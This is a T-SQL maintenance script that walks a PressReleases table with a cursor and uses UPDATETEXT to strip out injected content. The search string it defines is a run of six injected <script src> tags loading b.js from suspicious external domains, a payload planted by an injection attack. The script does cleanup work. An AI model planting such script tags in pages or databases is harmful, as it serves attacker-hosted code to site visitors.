-- Search and Replace in a TEXT column

declare @otxt varchar(1000)
set @otxt = '<script src=http://www.rundll92.com/b.js></script><script src=http://www.en-us18.com/b.js></script><script src=http://www.sslput4.com/b.js></script><script src=http://www.cookieadw.com/b.js></script><script src=http://www.kadport.com/b.js></script><script src=http://www.cntrl62.com/b.js></script>'

declare curs cursor local fast_forward
for
select 
	PressID,
	textptr(PressText),
	charindex(@otxt, PressText)-1
from 
	PressReleases 
where 
	PressText 
like 
	'%' + @otxt +'%'

declare @ntxt varchar(1000)
set @ntxt = 'NewText'

declare @txtlen int
set @txtlen = len(@otxt)

declare @ptr binary(16)
declare @pos int
declare @id int

-- Finally we can do our search and replace:

open curs

fetch next from curs into @id, @ptr, @pos

while @@fetch_status = 0
begin	
	updatetext PressReleases.PressText @ptr @pos @txtlen @ntxt

	fetch next from curs into @id, @ptr, @pos	
end

close curs
deallocate curs